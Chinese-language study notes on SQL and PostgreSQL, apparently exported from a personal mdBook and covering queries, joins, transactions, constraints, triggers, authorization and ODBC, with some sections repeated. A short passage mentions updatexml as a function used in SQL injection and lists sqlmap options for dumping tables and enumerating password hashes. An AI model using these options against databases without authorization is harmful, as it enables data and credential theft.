--outer join外联结,用别名书写方便,left表示指定左边的表为主表
using number
--设置联结键,不一定是主键.其实只要是逻辑表达式就可以,但是一般用等号居多.只要逻辑表达式的结果为True就会联结.而且主表中的数据一定会出现.
</code></pre>
<h2 id="八事务"><a class="header" href="#八事务">八、事务</a></h2>
<p>A <strong>transaction</strong> is a <strong>sequence of queries and data update statements executed as a single logical unit</strong>.
事务具有如下特性：</p>
<ul>
<li>atomicity 原子性：一个事务要么发生，要么不发生</li>
<li>consistence 一致性</li>
<li>isolation 隔离性</li>
<li>durability 持久性：一旦执行成功就会永久保存</li>
</ul>
<p>将一系列DML语句整合成一个<strong>事务Transaction</strong></p>
<pre><code class="language-sql">Begin Transaction;		--开始语句,不同的软件不一样,比如MySQL是start transaction
update TableName set number = 1;
... ...
End Transaction;
-- Begin Transaction = Begin
-- End Transaction = COMMIT。提交修改,改了就不能反悔了
-- 你可以用ROLLBACK代替COMMIT，表示回滚，前面的修改都不生效。
</code></pre>
<h2 id="九谓词返回真值"><a class="header" href="#九谓词返回真值">九、谓词(返回真值)</a></h2>
<h3 id="like模糊查找"><a class="header" href="#like模糊查找">LIKE模糊查找</a></h3>
<pre><code class="language-sql">select * from math_t where name LIKE 'Zhang%';			#百分号表示匹配任意多字符
select * from math_t where name LIKE '_hang%';			#_表示匹配一个字符
</code></pre>
<h3 id="between范围"><a class="header" href="#between范围">BETWEEN范围</a></h3>
<p>NULL的算数运算得到底还是NULL，NULL得逻辑运算会得到UNKNOWN。所以我们也有is unknow这种东西。</p>
<pre><code class="language-sql">select * from math_t where number BETWEEN 1 and 5; 	--筛选1~5之间
select * from math_t where number is null;			--为空
select * from math_t where number is not null;		--非空
select * from math_t where number in (1,2,3);		--在()之中
</code></pre>
<p>SQL还有一个特性可测试一个<strong>子查询</strong>的结果中是否存在元组。exists结构在作为参数的子查询为空时返回true值。</p>
<h2 id="关于字符串"><a class="header" href="#关于字符串">*关于字符串</a></h2>
<p>模糊查找，和正则表达式符号不同，可做参照。在WHERE字句中和LIKE连用：</p>
<ul>
<li><code>%</code> matches any substring.  (like * in file system)</li>
<li><code>_</code>  matches any character. (like ? In file system)
字符串函数 <code>upper</code>， <code>lower</code>， <code>||</code>（串联）</li>
</ul>
<h2 id="函数-1"><a class="header" href="#函数-1">*函数</a></h2>
<p>https://www.postgresql.org/docs/9.4/functions.html</p>
<pre><code class="language-sql">ABS()							绝对值
MOD(被除数,除数)					求余
ROUND(目标数,保留小数位数)			四舍五入

str1 || strr2 或 concat(str1,str2)		拼接
length(str)						求长
lower()	upper()					大小写转换
replace(对象,替换前,替换后)			替换
substring(对象from 开始位置 for 截取长度)		截取

current_date						当前日期
current_time						当前时间
current_timestamp					当前日期时间
extract(日期元素 From 日期)			提取日期元素(month,year)

cast(转换前的值 as 转换类型)			类型转换
coalesce(1,2,3,...)					返回第一个不是NULL的值
</code></pre>
<h2 id="case"><a class="header" href="#case">*CASE</a></h2>
<pre><code class="language-sql">select name ,case
when birth_date&gt;'2001-12-31' then 'adult' 
when birth_date&lt;='2001-12-31' then 'children'
else NULL						--其实case就是返回一个值,这里相当于default
end as age 						--设置该字段名
from math_t ;	

/*
case 
when 条件 then 表达式
when 条件 then 表达式
else 表达式
end
*/
</code></pre>
<h2 id="一些sql注入中常用的函数"><a class="header" href="#一些sql注入中常用的函数">*一些SQL注入中常用的函数</a></h2>
<p>updatexml	一百度全都是讲注入的笑死了
UPDATEXML (XML_document, XPath_string, new_value); 
第一个参数： XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
<h2 id="关于sqlmap"><a class="header" href="#关于sqlmap">*关于sqlmap</a></h2>
<p>-h输出帮助信息	-hh输出更详细的帮助信息
-u URL(记得加上注入点)
Enumeration里头表示你希望获取(retrieve)的后台的(back-end)信息</p>
<pre><code class="language-shell">-a, --all           Retrieve everything
-b, --banner        Retrieve DBMS banner
--current-user      Retrieve DBMS current user
--current-db        Retrieve DBMS current database
--passwords         Enumerate DBMS users password hashes
--tables            Enumerate DBMS database tables
--columns           Enumerate DBMS database table columns
--schema            Enumerate DBMS schema
--dump              Dump DBMS database table entries
--dump-all          Dump all DBMS databases tables entries
-D DB               DBMS database to enumerate
-T TBL              DBMS database table(s) to enumerate
-C COL              DBMS database table column(s) to enumerate File system access里头的参数可以让你读写文件。
</code></pre>
<h1 id="高级sql"><a class="header" href="#高级sql">高级SQL</a></h1>
<h2 id="一sql数据类型"><a class="header" href="#一sql数据类型">一、SQL数据类型</a></h2>
<p>Domain可以添加constrain；Domain不是强类型，如果底层的数据类型相同的话（比如下面的dollar和pounds）不同的Domain可以相互赋值。</p>
<pre><code class="language-sql">create type Dollars as numeric(12,2) ;      --创建数据类型
create domain Dollars as numeric(12, 2) not null;           --创建Domain
create domain Pounds as numeric(12,2);
</code></pre>
<p>Large-Object Types：对于大的对象，我们返回他的指针。</p>
<ul>
<li>blob: binary large object</li>
<li>clob: character large object</li>
</ul>
<h2 id="二integrity-constraints"><a class="header" href="#二integrity-constraints">二、Integrity Constraints</a></h2>
<p>完整性约束包括：域完整性、实体完整性（主键的约束）、参照完整性（外键的约束）和用户定义的完整性约束。常见的比如<code>not null</code>,<code>primary key</code>,<code>unique</code>。</p>
<h3 id="reference-integrity-constraints"><a class="header" href="#reference-integrity-constraints">Reference Integrity Constraints</a></h3>
<p>删除一个forgein key，怎么删？（比如删除计算机系，学生怎么办？）</p>
<ol>
<li>不让删（默认行为）</li>
<li>把相关的记录连带着删除了。但是这可能会导致多米诺骨牌效应，如果中间有一个是不让删除的，那么整个删除就失败了。</li>
</ol>
<p>这种连带行为的约束，用<strong>cascade</strong></p>
<pre><code class="language-sql">create table students(
    ...
    foreign key(dept_name) references department [on delete/update   cascade]
);
</code></pre>
<h3 id="check"><a class="header" href="#check">Check</a></h3>
<p>对于一般的条件检查，我们可以用check。</p>
<pre><code class="language-sql">create table SB (
    name varchar(4) not null,
    age integer check(age&gt;0) 
);
</code></pre>
<h3 id="assertion"><a class="header" href="#assertion">Assertion</a></h3>
<p>对于一些复杂的约束条件（往往可能和别的表、别的字段相关），我们无法把他简单的写在Check语句中，我们就需要assertion。这个特性并没有被广泛的支持。
过度的使用assertion会造成数据库效率的降低，因为每一次的插入都要执行一次判断。</p>
<pre><code class="language-sql">create assertion credits_earned_constraint check
    (not exists (select ID
    from student
    where tot_cred &lt;&gt; (select sum(credits)
        from takes natural join course
        where student.ID= takes.ID and grade is not null and grade &lt;&gt; ’F’);
</code></pre>
<h3 id="triggers-触发器"><a class="header" href="#triggers-触发器">Triggers 触发器</a></h3>
<p>A trigger is a statement that is <strong>executed automatically</strong> by the system as <strong>a side-effect of a modification</strong> to the database.
我们需要设置触发条件和触发行为。</p>
<pre><code class="language-sql">CREATE  TRIGGER trigger_name [BEFORE|AFTER|INSTEAD OF] event_name
ON table_name
[
 -- 触发器逻辑....
];
</code></pre>
<p>虽然触发器语法是SQL标准的一部分，但是大多数数据库系统用非标准的语法来说明触发器。比如postgresql，触发器的定义不包含执行内容，而是对每一行调用一个过程，使用<code>old</code>和<code>new</code>来访问包含该行的旧值和新的变量。触发器不进行rollback，而是发出一个异常。查阅手册，发现以下内容：</p>
<p>当一个PL/pgSQL函数当做触发器调用时，在顶层块会自动创建一些特殊变量。它们是：</p>
<ul>
<li>
<p><code>NEW</code></p>
<p>数据类型是<code>RECORD</code>；该变量为<strong>行级触发器</strong>中的<code>INSERT</code>/<code>UPDATE</code>操作保持新数据行。在语句级别的触发器以及<code>DELETE</code>操作，这个变量是null。</p>
</li>
<li>
<p><code>OLD</code></p>
<p>数据类型是<code>RECORD</code>；该变量为<strong>行级触发器</strong>中的<code>UPDATE</code>/<code>DELETE</code>操作保持新数据行。在语句级别的触发器以及<code>INSERT</code>操作，这个变量是null。</p>
</li>
<li>
<p><code>TG_NAME</code></p>
<p>数据类型是<code>name</code>；该变量包含实际触发的触发器名。</p>
</li>
<li>
<p><code>TG_WHEN</code></p>
<p>数据类型是<code>text</code>；是值为<code>BEFORE</code>、<code>AFTER</code>或<code>INSTEAD OF</code>的一个字符串，取决于触发器的定义。</p>
</li>
<li>
<p><code>TG_LEVEL</code></p>
<p>数据类型是<code>text</code>；是值为<code>ROW</code>或<code>STATEMENT</code>的一个字符串，取决于触发器的定义。</p>
</li>
<li>
<p><code>TG_OP</code></p>
<p>数据类型是<code>text</code>；是值为<code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code>或<code>TRUNCATE</code>的一个字符串，它说明触发器是为哪个操作引发。</p>
</li>
<li>
<p><code>TG_RELID</code></p>
<p>数据类型是<code>oid</code>；是导致触发器调用的表的对象 ID。</p>
</li>
<li>
<p><code>TG_RELNAME</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表的名称。现在已经被废弃，并且可能在未来的一个发行中消失。使用<code>TG_TABLE_NAME</code>替代。</p>
</li>
<li>
<p><code>TG_TABLE_NAME</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表的名称。</p>
</li>
<li>
<p><code>TG_TABLE_SCHEMA</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表所在的模式名。</p>
</li>
<li>
<p><code>TG_NARGS</code></p>
<p>数据类型是<code>integer</code>；在<code>CREATE TRIGGER</code>语句中给触发器函数的参数数量。</p>
</li>
<li>
<p><code>TG_ARGV[]</code></p>
<p>数据类型是<code>text</code>数组；来自<code>CREATE TRIGGER</code>语句的参数。索引从 0 开始记数。非法索引（小于 0 或者大于等于<code>tg_nargs</code>）会导致返回一个空值。</p>
<p>所以我们要创建触发器，还要编写对应的函数，如下例：</p>
<pre><code class="language-sql">-- 创建触发器
create trigger TRIGGER_NAME [before insert]
on TABLE_NAME [for each row]
execute procedure borrow_no_morell();

-- 创建函数
create function borrow_no_morell() returns trigger as $borrow_no_morell$
begin
    if (select count(*) from borrow where cno=new.cno)&gt;2 then
    raise exception 'cannot borrow more than 3';
    end if;
    RETURN NEW;
end
$borrow_no_morell$ LANGUAGE plpgsql;
</code></pre>
<p>这里给两个书上的例子，如果考试考的话可能要书写这样格式的trigger。</p>
<p><img src="Basic/Database/../images/image-20210403141347067.png" alt="image-20210403141347067" /></p>
</li>
</ul>
<h2 id="三authorization-授权-以postgresql为例"><a class="header" href="#三authorization-授权-以postgresql为例">三、Authorization 授权-以POSTGRESQL为例</a></h2>
<ul>
<li>Forms of authorization on parts of  the database:
<ul>
<li>Read authorization - allows reading, but not modification of data.</li>
<li>Insert authorization - allows insertion of new data, but not modification of existing data.</li>
<li>Update authorization - allows modification, but not deletion of data.</li>
<li>Delete authorization - allows deletion of data</li>
</ul>
</li>
<li>Forms of authorization to modify  the database schema:
<ul>
<li>Index authorization - allows creation and deletion of indices.</li>
<li>Resources authorization - allows creation of new relations.</li>
<li>Alteration authorization - allows addition or modifying of attributes in a relation.</li>
<li>Drop authorization - allows deletion of relations.</li>
</ul>
</li>
</ul>
<p>我们可以利用View，把View的权限给用户，而不把relation的权限给用户。这样还可以简化用户操作。
<img src="Basic/Database/../images/1616644577045.png" alt="" />
所有的权限都来自于DBA（比如postgres），我们要让DBA把权限<strong>GRANT</strong>给其他用户，可以用<strong>REVOKE</strong>收回权限。</p>
<pre><code class="language-sql">GRANT &lt;privilege list&gt; on &lt;relation name or view name&gt; to &lt;user name&gt; [with grant option]     --能不能再把权限分发
REVOKE&lt;privilege list&gt; ON &lt;relation name or view name&gt;	 FROM &lt;user list&gt;  [ restrict | cascade ]       --cascade，把分发出去的权限也收回来
grant select, insert on instructor to U1, U2, U3;       --To grant users U1, U2, and U3 select and insert authorization on the instructor relation:
grant all privileges on instructor to reticence;		--授予所有权限.
revoke select on instructor from reticence;				--收回select权限
</code></pre>
<p>privilege list包括：（下面的所有权限都是对relation数据的操作，DML和DCL，不包括DDL（除了reference））</p>
<ul>
<li>select: allows read access to relation, or the ability to query using the view</li>
<li>insert: the ability to insert tuples.</li>
<li>update: the ability  to update using the SQL update statement.</li>
<li>delete: the ability to delete tuples.</li>
<li><strong>references</strong>: ability to declare foreign keys when creating relations.</li>
<li><strong>all privileges</strong>: used as a short form for all the allowable privileges.</li>
<li>DBMS没有实现更细粒度的权限管理，比如relation中的tuple权限。这个要由应用去管理。而我们甚至通常把所有的权限都交给应用程序，然后把权限都交给应用程序管理，</li>
</ul>
<p>ROLE：把权限赋给一个抽象的role，然后给具体的user指定一个role。</p>
<pre><code class="language-sql">create role instructor;     --创建role
grant select on takes to instructor;    --像给user授权一样给role授权
grant instructor to Amy;    --让user Amy拥有instructor的权限
</code></pre>
<p>数据库</p>
<pre><code class="language-sql">alter database third owner to reticence;
</code></pre>
<h2 id="四audit-trail"><a class="header" href="#四audit-trail">四、Audit trail</a></h2>
<p>审计跟踪（audit trail）是关于应用程序数据的所有更改（插入/删除/更新）的日志，以及一些信息，如哪个用户执行了更改和什么时候执行的更改。</p>
<h2 id="五在别的语言中使用-sql"><a class="header" href="#五在别的语言中使用-sql">五、在别的语言中使用 SQL</a></h2>
<p>在别的语言中使用SQL。有三种形式：</p>
<ul>
<li>
<p>嵌入式SQL：程序在编译前必须由一个特殊的预处理器进行处理。每一种语言的嵌入式SQL不同。由于不好用，所以用的很少。</p>
</li>
<li>
<p>动态SQL，比如开放数据库互连（Open DataBase Connectivity，ODBC），一般是用于基础设施的建设。</p>
<ul>
<li>用于应用程序与数据库服务通信的标准。所以每一个DB厂商都会提供。</li>
<li>标准定义了一个API
<ol>
<li>建立一个和服务器的连接</li>
<li>发送查询、更新请求等</li>
<li>获取返回结果</li>
</ol>
</li>
<li>Python有<a href="https://pypi.org/project/pyodbc/">pyodbc</a>，Rust有<a href="https://docs.rs/odbc-api/0.17.0/odbc_api/">odbc_api</a>。</li>
</ul>
</li>
<li>
<p>还有更高级的接口，让我们可以更方便的连接数据库。也是使用最广泛的。</p>
</li>
</ul>
<h3 id="odbc"><a class="header" href="#odbc">ODBC</a></h3>
<p><img src="Basic/Database/../images/image-20210401101615755.png" alt="image-20210401101615755" /></p>
<p>ODBC规定了三种句柄： environment handle, connect handle, statement handle.</p>
<p><img src="Basic/Database/../images/image-20210401102128728.png" alt="image-20210401102128728" /></p>
<pre><code class="language-c">//查询结果和自定义变量进行绑定
SQLBindCol ()
SQLFetch()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="基础sql-1"><a class="header" href="#基础sql-1">基础SQL</a></h1>
<h2 id="一一些概念-1"><a class="header" href="#一一些概念-1">一、一些概念</a></h2>
<p>行称为<strong>记录 record</strong>，也可以叫做<strong>元组 tuple</strong>。列称为<strong>字段 field</strong>，也可以叫做<strong>属性 attribute</strong>。</p>
<p>一张<strong>表 table</strong>也被称为 <strong>关系relation</strong>。是元组的集合。</p>
<p>码：</p>
<ul>
<li>superkey: 是一个或多个attribute的集合，可以让我们在一个relation中唯一的标识一个tuple。</li>
<li>candidate key: 最小的superkey，准确的说是candidate key是superkey但是他的任何一个真子集都不是superkey。他不一定是唯一的。</li>
<li>primary key: 被数据设计者选中的用来在一个relation中区分不同tuple的candidate key。</li>
</ul>
<h2 id="二数据类型和约束条件-1"><a class="header" href="#二数据类型和约束条件-1">二、数据类型和约束条件</a></h2>
<ul>
<li>数字类型：
<ul>
<li>INTEGER</li>
</ul>
</li>
<li>字符串：
<ul>
<li>CHAR</li>
<li>VARCHAR</li>
</ul>
</li>
<li>时间日期：
<ul>
<li>DATE</li>
</ul>
</li>
</ul>
<p>约束条件，常见的有：</p>
<ul>
<li>NOT NULL 非空，必须输入</li>
<li>primary key		主键，唯一索引 </li>
<li>default 0			默认值</li>
</ul>
<h2 id="三sql命令-1"><a class="header" href="#三sql命令-1">三、SQL命令</a></h2>
<p>最常用的命令：<code>select 你要的字段 from 数据表 where 行筛选条件 group by 分组字段 having 组筛选条件 order by 排序字段</code>
执行顺序：<code>From-&gt;where-&gt;group(aggregate)-&gt;having-&gt;select-&gt;order by</code></p>
<h3 id="ddldata-definition-language-1"><a class="header" href="#ddldata-definition-language-1">DDL(data definition language)</a></h3>
<h4 id="create-1"><a class="header" href="#create-1">CREATE</a></h4>
<p>创建数据库：</p>
<pre><code class="language-sql">CREATE database shop;	
</code></pre>
<p>创建数据表</p>
<pre><code class="language-sql">CREATE table 表名（
字段名1 类型 约束条件，
字段名2 类型 约束条件，
字段名3 类型 约束条件，
该表的约束条件1，该表的约束条件2，该表的约束条件3）;

CREATE table food (
food_name VARCHAR(20) ,
);
</code></pre>
<h4 id="drop-1"><a class="header" href="#drop-1">DROP</a></h4>
<p>删除数据库：</p>
<pre><code class="language-sql">DROP database shop;
</code></pre>
<p><strong>删除数据表：</strong></p>
<pre><code class="language-sql">DROP table food;
</code></pre>
<h4 id="alter-1"><a class="header" href="#alter-1">ALTER</a></h4>
<p><strong>更新数据表：</strong>
其实alter开头的指令非常多。</p>
<pre><code class="language-sql">ALTER table food add column birthdate DATE;				--添加列
ALTER table math_teacher drop column birthdate; 		--删除列
ALTER table math_teacher rename to english_teacher;		--重命名表
ALTER table branch add primary key (branch_name);       --添加主键约束
ALTER table card add check(type in ('T','G','U','O','K'));      --添加检查check
ALTER table card drop constraint card_type_check ;          --删除检查check
</code></pre>
<h3 id="dmldata-manipulation-language-1"><a class="header" href="#dmldata-manipulation-language-1">DML(Data Manipulation language)</a></h3>
<h4 id="select-1"><a class="header" href="#select-1">SELECT</a></h4>
<p>query，查询数据表中的数据，最重要的语句。SELECT语句。</p>
<pre><code class="language-sql">select * from math_t;							--从表中查询所有字段
select A,B,C from TableName;					--从表中查询A、B、C字段
select birth_date as d from Table;				--设置别名
select birth_date as &quot;birthday&quot; from Table;		--设置别名，中文要用双引号括起来
select 0 as &quot;chufen&quot;,name as &quot;name&quot; from math_t;--添加常数字段
select distinct birth_date from math_t;			--去重,重复的记录只显示一次,distinct应该在第一个字段之前
</code></pre>
<h4 id="where-1"><a class="header" href="#where-1">WHERE</a></h4>
<p>where的常见用法。无论如何，WHERE里不可能出现聚合函数。</p>
<pre><code class="language-sql">select * from math_t where birth_date&gt;'2001-10-01';	--where后面加上筛选条件
select bno,count(*) into book_count from borrow where borrow_date between '2019-1-1' and '2019-12-21' group by bno;     --属于某个时间段内
select number+1 from math_t;						--算数运算符+-*/()
select * from math_t where name&lt;&gt;'';	        --不等号
select bno,count(*) as bor from borrow where return_date is null group by bno;select * from math_t where number is not null;
--is not null表示不是NULL,is null表示是null
--null的真值是不确定,SQL的真值有三个(真的SB),短路原则适用.
</code></pre>
<p>比较运算符有<code>&lt;&gt;,=,&gt;,&lt;,&gt;=,&lt;=</code>
字符串按照字典序进行比较
时间可以比较大小，Between A and B
逻辑运算符<code>not and or ()</code>
要注意的是，SQL的真值中还有一个叫不确定：
<img src="Basic/Database/../images/1615554797028.jpg" alt="" /></p>
<h4 id="insert-1"><a class="header" href="#insert-1">Insert</a></h4>
<pre><code class="language-sql">insert into TableName values (‘Ji Gaoqiang’,’2001-10-07’);			--全部字段添加值
insert into TableName values (‘Ji Gaoqiang’,’2001-10-07’,default);	--显式添加默认值
insert into TableName (list) values (value);						--部分字段添加值
insert INTO tableA select * from tableB;							--表的复制,不用
</code></pre>
<h3 id="dcldata-control-language-1"><a class="header" href="#dcldata-control-language-1">DCL(Data control language)</a></h3>
<h4 id="delete-1"><a class="header" href="#delete-1">DELETE</a></h4>
<pre><code class="language-sql">delete from TableName;							--删除表中的全部数据
delete from math_t where birth_date is null;	--根据条件删除表中的数据
</code></pre>
<h4 id="update-1"><a class="header" href="#update-1">UPDATE</a></h4>
<pre><code class="language-sql">update TableName set number = 1;					--全部数据的更新
update TableName set number = 1 where name=’Ji GQ’;	--指定数据的更新
</code></pre>
<h2 id="四聚合函数-1"><a class="header" href="#四聚合函数-1">四、聚合函数</a></h2>
<p>count是唯一一个把NULL算进去的聚合函数。</p>
<pre><code class="language-sql">select count(*) from math_t;				--count()数记录数,*包括NULL
select count(number),count(birth from math_t from math_t;	--count()数记录数,其他不包括NULL
select sum(number) from math_t;				--一列的和,忽略NULL
select sum(distinct number) from math_t; 	--一列去重之后的和
select AVG(number) from math_t;				--一列的平均值,忽略NULL
select max(number) from math_t;				--一列的最大值,忽略NULL
select min(number) from math_t;				--一列的最小值,忽略NULL
</code></pre>
<h3 id="distinct-1"><a class="header" href="#distinct-1">DISTINCT</a></h3>
<p>在聚合函数的参数中使用DISTINCT，可以删除重复数据。</p>
<h3 id="group-by-1"><a class="header" href="#group-by-1">GROUP BY</a></h3>
<p>GROUP BY可以把表再进行切分。select字句中只能出现<strong>聚合函数、或者GROUP BY中指定的列名，常数</strong>。另外不要再GROUP BY字句中使用别名。</p>
<pre><code class="language-sql">select birth_date,count(*) from math_t group by birth_date ;
-- select子句只能出现Group By 的依据(聚合键)/聚合函数/常数,写别的字段名会出错
-- 去重切割,所有的NULL也会被聚合到一起
-- Group by的分组结果是无序的
select birth_date,count(*) from math_t group by birth_date having count(*)=1;
-- having对聚合结果进行筛选,where不行
-- having子句里只能出现 常数/聚合函数/聚合键
</code></pre>
<h3 id="order-by-1"><a class="header" href="#order-by-1">ORDER BY</a></h3>
<p>使用order by对查询结果进行排序。默认升序，如果需要降序排序，在最后加上desc。</p>
<pre><code class="language-sql">select * from math_t order BY birth_date ;
-- 按照count关键字生序排序,如果想降序后面跟desc. 有NULL的话会在开头或末尾
select number,count(*) from math_t group by number order by count(*);
-- 多关键字,优先左边的排序; 可以跟聚合函数排序
</code></pre>
<h2 id="五视图-子查询-标量子查询-1"><a class="header" href="#五视图-子查询-标量子查询-1">五、视图 子查询 标量子查询</a></h2>
<p>视图存储的是select语句而不是表，虽然看起来就是表，有点脚本的味道。
这样就可以不让用户直接操作表了，提高了安全性。还可以定制用户想得到的表，提高易用性。
存储View还有一个特点，就是如果定义View的实际Relation发生了改变，View也会跟着修改。这样的视图叫做materialized view
对视图进行的SELECT查询操作和表用起来差不多，但是在插入和删除的时候就感觉有点奇怪了。因为我们要把对View的修改翻译成对数据库中实际Relation的修改。<strong>一般情况下</strong>我们不能修改视图。</p>
<pre><code class="language-sql">create view 视图名称 (视图列名1 ,视图列名2,...) as
select 语句

create view viewexample (&quot;name&quot;,&quot;birth&quot;)	--视图列名
as											--不能省略
select name,number from math_t ;			--创建视图
--然后就可以用 select * form viewexample 查看视图了
--创建视图的select语句不能有order by,因为视图和表一样,是无序的
drop view viewexample ;						--删除视图
</code></pre>
<p>子查询的特点概括起来就是一张一次性视图。视图并不是用来保存数据的，而是通过保存读取数据的SELECT 语句的方法来为用户提供便利。类似的，子查询就是将用来定义视图的SELECT语句需要一张表的地方。</p>
<p>进一步的，来自外层查询的相关名称可以用在<strong>WHERE字句的子查询</strong>中。使用了来自外层查询相关名称的子查询被称为<strong>相关子查询correlated subquery</strong>。</p>
<ul>
<li>集合成员资格 ：连接词<strong>IN</strong>测试元组是否是集合中的成员。类似的还有NOT IN。<code>XXX IN 子查询</code></li>
<li>集合的比较： <strong>SOME</strong>可以表示“集合中的某个”的意思。 <code>XXX IN 子查询</code>等价于<code>XXX = SOME(子查询)</code>。<code>XXX&gt;SOME(子查询)</code>表示XXX比（至少）集合中的某个要大。类似的还有<strong>ALL</strong>表示“集合中的每个”的意思。<code>XXX NOT IN(子查询)</code>等价于<code>XXX &lt;&gt; ALL(子查询)</code>，<code>XXX&gt;ALL(子查询)</code>表示XXX比集合中的每个都大。</li>
<li>空关系测试：<code>EXIST(子查询)</code>在子查询非空的时候，<strong>EXIST</strong>结构返回True。</li>
<li>重复元组存在性测试：<code>UNIQUE(子查询)</code>如果子查询中没有重复的元素，<strong>UNIQUE</strong>结构返回TRUE。</li>
<li>from子句中的子查询</li>
<li>with子句：提供了定义临时关系的办法。<code>WITH 临时表名 (列名1,列名2) AS (子查询)</code>，这句写在最前面，后面的select语句就可以用这个临时表了。</li>
</ul>
<pre><code class="language-sql">SELECT product_type, cnt_product
FROM ( SELECT product_type, COUNT(*) AS cnt_product
FROM Product
GROUP BY product_type ) AS ProductSum;
</code></pre>
<p>返回的值只有一行一列(就是一个值啦)就是<strong>标量子查询</strong>。标量子查询的书写位置并不仅仅局限于 WHERE 子句中，通常任何可以使用单一值的位置都可以使用。也就是说，能够使用常数或者列名的地方，无论是 SELECT 子句、GROUP BY 子句、HAVING 子句，还是ORDER BY 子句，几乎所有的地方都可以使用。</p>
<pre><code class="language-sql">select * from math_t where number &gt; (select avg(number) from math_t );
--要注意where的条件中不能出现聚合函数,划线部分为标量子查询.
--标量子查询在需要一个值的地方几乎都能使用
</code></pre>
<h2 id="六集合运算-1"><a class="header" href="#六集合运算-1">六、集合运算</a></h2>
<p>集合运算要求列数一致,每一列的类型一致。别的操作往往默认保留重复，但是<strong>集合运算必须加上关键词ALL才会保留重复</strong>。</p>
<pre><code class="language-sql">select * from math_bak 
union all						--并集,允许重复的项
select * from math_t;			--要求两个表/视图中列的类型一致,字段名倒不要求

select * from math_bak 
union 							--并集,合并重复的项
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现

select * from math_bak 
intersect 						--交集,前后两个表重复的部分,同样的如果保留重复行加ALL
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现

select * from math_bak 
except 							--差集
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现
</code></pre>
<h2 id="七连接-join-1"><a class="header" href="#七连接-join-1">七、连接 Join</a></h2>
<p>集合运算是添加或减少行,联结则是改变列。</p>
<p>inner：左边和右边无法匹配的记录，都不会保留。一般来说这样的语句可以简单的用select where代替。
full outer：左边和右边无法匹配的记录，都会保留。那些无法匹配的记录的值会用null填充。
left outer：左边无法匹配的记录会保留。那些无法匹配的记录的值会用null填充。
写法（inner和outer是可以省略的，不影响含义）：</p>
<ul>
<li>自然连接<code>R natural {inner join,left outer join,right outer join,full outer join}  S using &lt;A1,A2...&gt;</code></li>
<li>非自然连接<code>R {inner join,left outer join,right outer join,full outer join} S on {condition} using &lt;A1,A2...&gt;</code></li>
</ul>
<pre><code class="language-sql">select I.id, T.name, T.birth_date 
from math_i as I inner join math_t as T		--inner join内联结,用别名书写方便
on I.number = T.number;					
--设置联结键,不一定是主键.其实只要是逻辑表达式就可以,但是一般用等号居多.只要逻辑表达式的结果为True就会联结,不一定是一对一

select I.id, T.name, T.birth_date 
from math_i as I left outer join math_t as t			
--outer join外联结,用别名书写方便,left表示指定左边的表为主表
using number
--设置联结键,不一定是主键.其实只要是逻辑表达式就可以,但是一般用等号居多.只要逻辑表达式的结果为True就会联结.而且主表中的数据一定会出现.
</code></pre>
<h2 id="八事务-1"><a class="header" href="#八事务-1">八、事务</a></h2>
<p>A <strong>transaction</strong> is a <strong>sequence of queries and data update statements executed as a single logical unit</strong>.
事务具有如下特性：</p>
<ul>
<li>atomicity 原子性：一个事务要么发生，要么不发生</li>
<li>consistence 一致性</li>
<li>isolation 隔离性</li>
<li>durability 持久性：一旦执行成功就会永久保存</li>
</ul>
<p>将一系列DML语句整合成一个<strong>事务Transaction</strong></p>
<pre><code class="language-sql">Begin Transaction;		--开始语句,不同的软件不一样,比如MySQL是start transaction
update TableName set number = 1;
... ...
End Transaction;
-- Begin Transaction = Begin
-- End Transaction = COMMIT。提交修改,改了就不能反悔了
-- 你可以用ROLLBACK代替COMMIT，表示回滚，前面的修改都不生效。
</code></pre>
<h2 id="九谓词返回真值-1"><a class="header" href="#九谓词返回真值-1">九、谓词(返回真值)</a></h2>
<h3 id="like模糊查找-1"><a class="header" href="#like模糊查找-1">LIKE模糊查找</a></h3>
<pre><code class="language-sql">select * from math_t where name LIKE 'Zhang%';			#百分号表示匹配任意多字符
select * from math_t where name LIKE '_hang%';			#_表示匹配一个字符
</code></pre>
<h3 id="between范围-1"><a class="header" href="#between范围-1">BETWEEN范围</a></h3>
<p>NULL的算数运算得到底还是NULL，NULL得逻辑运算会得到UNKNOWN。所以我们也有is unknow这种东西。</p>
<pre><code class="language-sql">select * from math_t where number BETWEEN 1 and 5; 	--筛选1~5之间
select * from math_t where number is null;			--为空
select * from math_t where number is not null;		--非空
select * from math_t where number in (1,2,3);		--在()之中
</code></pre>
<p>SQL还有一个特性可测试一个<strong>子查询</strong>的结果中是否存在元组。exists结构在作为参数的子查询为空时返回true值。</p>
<h2 id="关于字符串-1"><a class="header" href="#关于字符串-1">*关于字符串</a></h2>
<p>模糊查找，和正则表达式符号不同，可做参照。在WHERE字句中和LIKE连用：</p>
<ul>
<li><code>%</code> matches any substring.  (like * in file system)</li>
<li><code>_</code>  matches any character. (like ? In file system)
字符串函数 <code>upper</code>， <code>lower</code>， <code>||</code>（串联）</li>
</ul>
<h2 id="函数-2"><a class="header" href="#函数-2">*函数</a></h2>
<p>https://www.postgresql.org/docs/9.4/functions.html</p>
<pre><code class="language-sql">ABS()							绝对值
MOD(被除数,除数)					求余
ROUND(目标数,保留小数位数)			四舍五入

str1 || strr2 或 concat(str1,str2)		拼接
length(str)						求长
lower()	upper()					大小写转换
replace(对象,替换前,替换后)			替换
substring(对象from 开始位置 for 截取长度)		截取

current_date						当前日期
current_time						当前时间
current_timestamp					当前日期时间
extract(日期元素 From 日期)			提取日期元素(month,year)

cast(转换前的值 as 转换类型)			类型转换
coalesce(1,2,3,...)					返回第一个不是NULL的值
</code></pre>
<h2 id="case-1"><a class="header" href="#case-1">*CASE</a></h2>
<pre><code class="language-sql">select name ,case
when birth_date&gt;'2001-12-31' then 'adult' 
when birth_date&lt;='2001-12-31' then 'children'
else NULL						--其实case就是返回一个值,这里相当于default
end as age 						--设置该字段名
from math_t ;	

/*
case 
when 条件 then 表达式
